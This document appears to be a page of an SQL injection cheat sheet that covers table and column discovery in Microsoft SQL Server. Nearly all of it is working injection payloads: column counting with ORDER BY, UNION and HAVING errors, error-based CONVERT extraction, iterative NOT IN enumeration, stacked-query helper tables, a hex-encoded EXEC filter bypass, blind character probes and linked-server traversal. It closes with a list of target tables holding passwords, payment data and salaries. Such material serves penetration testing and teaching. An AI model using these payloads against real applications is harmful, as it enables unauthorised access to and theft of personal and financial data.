---
title: Tables and Columns
description: How to discover and extract table and column information in MSSQL
category: Information Gathering
order: 7
tags: ["tables", "columns", "schema discovery"]
lastUpdated: 2026-10-08
---

Discovering table and column information is a crucial step in SQL injection attacks against Microsoft SQL Server. This knowledge allows for targeted data extraction and more advanced exploitation.

## Determining Number of Columns

Before extracting table information, you need to determine the number of columns in the current query result set.

### Using ORDER BY

```sql
-- String context: increase the number until you get an error
' ORDER BY 1-- (Valid)
' ORDER BY 2-- (Valid)
' ORDER BY 3-- (Valid)
' ORDER BY 4-- Error 108: "The ORDER BY position number 4 is out of range" (3 columns)
```

### Using UNION SELECT NULL

```sql
-- Incrementally try different numbers of NULLs
' UNION SELECT NULL--         -- Errors if wrong number of columns
' UNION SELECT NULL,NULL--    -- Errors if wrong number of columns
' UNION SELECT NULL,NULL,NULL-- -- Works if query has exactly 3 columns
```

### Using GROUP BY/HAVING Error Messages

When errors are displayed, `HAVING` without a matching `GROUP BY` raises error 8120 naming the next selected column (as `table.column`). Add each revealed column to the `GROUP BY` list and repeat; the column count is the number of columns found once the error stops (string context, query `SELECT id, username, password, ... FROM users`):

```sql
1' HAVING 1=1--
-- Column 'users.id' is invalid in the select list because it is not contained in ...

1' GROUP BY users.id HAVING 1=1--
-- Column 'users.username' is invalid in the select list ...

1' GROUP BY users.id, users.username HAVING 1=1--
-- Column 'users.password' is invalid in the select list ...

-- Continue until the query runs without error
```

## Information Schema Views

SQL Server provides standardized INFORMATION_SCHEMA views for metadata discovery:

### Listing Tables

```sql
-- List all tables in the current database
SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE'

-- Include schema name and table type
SELECT table_schema, table_name, table_type
FROM information_schema.tables
ORDER BY table_schema, table_name
```

### Listing Columns

```sql
-- List all columns for a specific table
SELECT column_name, data_type, character_maximum_length
FROM information_schema.columns
WHERE table_name = 'users'

-- List all columns with their tables
SELECT table_name, column_name, data_type, character_maximum_length
FROM information_schema.columns
ORDER BY table_name, ordinal_position
```

## System Catalog Views

SQL Server's system catalog views provide more detailed metadata:

### Tables via sys.tables and sys.objects

```sql
-- List user tables using sys.tables
SELECT name, create_date FROM sys.tables ORDER BY name

-- Using sys.objects (SQL Server 2005+; type 'U' = user table)
SELECT name FROM sys.objects WHERE type = 'U' ORDER BY name
```

### Columns via sys.columns

```sql
-- Get columns for a specific table
SELECT name, column_id, system_type_id
FROM sys.columns
WHERE object_id = OBJECT_ID('dbo.users')

-- Get all columns with their table names
SELECT o.name AS table_name, c.name AS column_name
FROM sys.columns c
JOIN sys.objects o ON o.object_id = c.object_id
WHERE o.type = 'U'
ORDER BY o.name, c.column_id
```

## Compatibility Views (sysobjects, syscolumns)

The SQL Server 2000 system tables `sysobjects` and `syscolumns` are still available as compatibility views (deprecated, "will be removed in a future version"), so these queries still work on SQL Server 2017 through 2022:

```sql
-- List user tables
SELECT name FROM sysobjects WHERE xtype = 'U'

-- List views
SELECT name FROM sysobjects WHERE xtype = 'V'

-- List columns for a table
SELECT c.name FROM syscolumns c
JOIN sysobjects o ON c.id = o.id
WHERE o.name = 'users'
```

## String Concatenation for Multiple Results

When you can only return a single value, use concatenation:

```sql
-- Concatenate table names (SQL Server 2017+)
SELECT STRING_AGG(name, ',') FROM sys.tables

SELECT STUFF((
    SELECT ',' + name
    FROM sys.tables
    FOR XML PATH('')
), 1, 1, '')
```

## Bulk Extraction Through a Helper Table

On SQL Server 2000, which has neither `STRING_AGG` nor `FOR XML PATH`, the classic approach concatenates all names into a variable with `SELECT @xy=@xy+...`, stores the result in a table, and reads it back with an error-based request. The `SELECT ... INTO` creates a regular table, so it persists between requests until dropped (numeric context):

```sql
-- 1. Concatenate all user table names into a new table
1 AND 1=0; DECLARE @xy varchar(8000) SET @xy='' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' SELECT @xy AS xy INTO TMP_DB--

-- 2. Read it through a conversion error (first chunk; then SUBSTRING(xy,1501,1500), ...)
1 AND 1=(SELECT TOP 1 SUBSTRING(xy,1,1500) FROM TMP_DB)--

-- 3. Cleanup
1 AND 1=0; DROP TABLE TMP_DB--
```

**Important:** This requires stacked queries and permission to create tables in the current database (`CREATE TABLE`, e.g. `db_owner` or `db_ddladmin`). A conversion error message shows the first 1,991 characters of the value (the message is capped at 2,047; same on 2017, 2019 and 2022), and values longer than `nvarchar(4000)` or `varchar(8000)` fail with "String or binary data would be truncated" instead of leaking; applications may also show less, hence the chunks. On SQL Server 2005 and later the same result is available in one request without a helper table:

```sql
1 AND 1=CONVERT(int,(SELECT STUFF((SELECT ','+name FROM sys.tables FOR XML PATH('')),1,1,'')))--

-- The list is nvarchar(max): past 4,000 characters it leaks nothing, so read it in chunks
1 AND 1=CONVERT(int,SUBSTRING((SELECT STUFF((SELECT ','+name FROM sys.tables FOR XML PATH('')),1,1,'')),1,1500))--
1 AND 1=CONVERT(int,SUBSTRING((SELECT STUFF((SELECT ','+name FROM sys.tables FOR XML PATH('')),1,1,'')),1501,1500))--
```

## Practical Injection Examples

### UNION Attack for Tables

These assume a string injection point in a 3-column query whose second column is displayed and is a string:

```sql
-- Basic UNION attack to get table names
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--

-- Get both schema and table names
' UNION SELECT NULL, table_schema + '.' + table_name, NULL FROM information_schema.tables--
```

```sql
-- Get columns for a specific table
' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name = 'users'--

-- Get table and column names
' UNION SELECT NULL, table_name + '.' + column_name, NULL FROM information_schema.columns--
```

### Error-Based Extraction

```sql
-- Using error-based extraction for table names
' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.tables))--
```

Comparing a string to the integer `1` forces a conversion, and the error message contains the value (`Conversion failed when converting the nvarchar value 'users' to data type int`).

**Iterative NOT IN extraction:** Run the first query to get result A, then add A to the `NOT IN()` list to get result B, then `NOT IN('A','B')` to get C, and so on until no new results are returned.

```sql
-- First iteration: get first table (e.g., returns 'users')
' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--

-- Second iteration: exclude 'users' to get next table (e.g., 'products')
' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN('users'))--

-- Third iteration: exclude both to get next (e.g., 'articles')
' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN('users','products'))--

-- Same pattern for columns
' AND 1=(SELECT TOP 1 column_name FROM information_schema.columns)--
' AND 1=(SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN('id'))--
```

This accumulating exclusion pattern is most effective when the injection produces visible output (error-based, UNION-based, or direct result display) so the attacker can observe each returned value. In fully blind contexts where no output is visible, use boolean-based or time-based techniques instead (see Blind Extraction below).

### Hex Encoding for WAF Bypass

Hex encoding can bypass simple keyword-based WAFs that block strings like `SELECT` or `FROM`. The actual SQL keywords are hidden inside a hex literal, decoded at runtime via `CAST`, and executed dynamically with `EXEC`:

```sql
' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x53454c454354202a2046524f4d207573657273 AS VARCHAR(4000)); EXEC (@S);--
-- 0x53454c454354202a2046524f4d207573657273 = 'SELECT * FROM users'
```

**Note:** This requires stacked queries support, and the `SELECT` output arrives as a second result set that many applications never display, so it is mostly useful for statements with side effects. The hex string itself passes through the WAF undetected, but `DECLARE`, `CAST`, and `EXEC` keywords may still be blocked by more sophisticated filters.

### Blind Extraction

```sql
-- Check first character of first table name
' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.tables), 1, 1)) = 117--
-- Where 117 is ASCII for 'u'
```

## Database Link Traversal

For linked servers (listed in `sys.servers`), you can query tables across servers with four-part names. The remote query runs with the linked server's login mapping:

```sql
-- Query tables on linked server
SELECT * FROM [linked_server].master.information_schema.tables

-- Four-part naming syntax
SELECT * FROM [linked_server].[database].[schema].[table]
```

## System Tables to Target

Common interesting tables to look for:

| Table Name               | Description          | Interesting Columns                |
| ------------------------ | -------------------- | ---------------------------------- |
| users, accounts, members | User information     | username, password, email          |
| customers, clients       | Customer data        | name, email, address, payment_info |
| orders, transactions     | Order information    | order_id, customer_id, amount      |
| products, items          | Product catalog      | id, name, price                    |
| config, settings         | Configuration data   | setting_name, setting_value        |
| employees, staff         | Employee information | name, salary, position             |

## Notes

1. Some system tables and views require elevated privileges
2. Information schema views are more standard across database systems
3. System catalog views (sys.\*) provide SQL Server-specific details
4. For very large databases, query performance may be affected
5. Column and table names are usually case-insensitive in SQL Server
